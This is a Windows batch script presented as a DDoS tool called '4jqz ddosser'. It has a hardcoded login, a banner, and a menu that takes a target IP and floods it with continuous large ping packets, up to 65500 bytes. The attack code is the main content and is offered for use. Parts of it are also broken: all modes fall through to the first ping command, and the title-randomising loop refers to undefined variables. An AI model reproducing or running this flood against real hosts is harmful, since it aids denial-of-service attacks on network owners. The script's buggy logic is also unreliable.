@echo off >nul
title 4jqz ddosser
chcp 65001 >nul

:login
set /p username=enter username ═════^> 
if "%username%"=="4jqzware" goto password
echo Invalid username, try again.
timeout /t 3 >nul
goto login

:password
set /p password=enter password ═════^> 
if "%password%"=="DDOSER" goto success
echo Incorrect password. Try again.
timeout /t 3 >nul
goto login

:success
echo Correct password, going to menu in 5 seconds...
cls
echo 3
timeout /t 1 >nul
echo 2
timeout /t 1 >nul
echo 1
timeout /t 1 >nul
echo Loading menu...
goto banner

:banner
cls
echo.
echo                [38;2;0;0;0m██╗  ██╗     ██╗ ██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ███████╗███████╗██████╗ 
echo                [38;2;51;51;51m██║  ██║     ██║██╔═══██╗╚══███╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝██╔══██╗
echo                [38;2;102;102;102m███████║     ██║██║   ██║  ███╔╝     ██║  ██║██║  ██║██║   ██║███████╗█████╗  ██████╔╝
echo                [38;2;153;153;153m╚════██║██   ██║██║▄▄ ██║ ███╔╝      ██║  ██║██║  ██║██║   ██║╚════██║██╔══╝  ██╔══██╗
echo                     [38;2;204;204;204m██║╚█████╔╝╚██████╔╝███████╗    ██████╔╝██████╔╝╚██████╔╝███████║███████╗██║  ██║
echo                     [38;2;255;255;255m╚═╝ ╚════╝  ╚═════╝ ╚══════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
echo                                                Welcome %username%
echo.

echo Would you like to initiate the DDoS attack? (yes/no)
set /p option= ═════^> 

if "%option%"=="yes" goto ddos-tool
if "%option%"=="no" goto exit
echo Invalid input. Please type 'yes' or 'no'.
goto banner

:ddos-tool
cls
set /p IPINFO= Please state targeted IP, press Ctrl + C to stop DDoS: 
echo.
echo - DDoS target with 15,000 Bit (command: 15)
echo - DDoS target with 30,000 Bit (command: 30)
echo - DDoS target with 40,000 Bit (command: 40)
echo - DDoS target with Maximum Bit (command: kill)
set /p DDOSOP=Please state ddos mode 15,30,40 or Kill mode?

if "%DDOSOP%"=="15" goto random-title-loop
if "%DDOSOP%"=="30" goto random-title-loop
if "%DDOSOP%"=="40" goto random-title-loop
if "%DDOSOP%"=="kill" goto random-title-loop

:random-title-loop
cls
echo Changing title rapidly...
for /l %%i in (1,1,10) do (
    set "randStr="
    for /l %%j in (1,1,6) do (
        set /a "charNum=!random! %% 26 + 65"
        for %%k in (!charNum!) do set "randStr=!randStr!!char:%%k!"
    )
    title !randStr!
    timeout /t 0.15 >nul
)

echo Title change finished. Proceeding with DDoS mode...
goto ddos1

:ddos1
color b
cls
echo DDoS attack with 15,000 Bit on %IPINFO%...
ping %IPINFO% -t -l 15000

:ddos2
color b
cls
echo DDoS attack with 30,000 Bit on %IPINFO%...
ping %IPINFO% -t -l 30000

:ddos3
color b
cls
echo DDoS attack with 40,000 Bit on %IPINFO%...
ping %IPINFO% -t -l 40000

:ddos4
color b
cls
echo DDoS attack with Maximum Bit on %IPINFO%...
ping %IPINFO% -t -l 65500

:exit
echo Exiting program...
timeout /t 2 >nul
exit
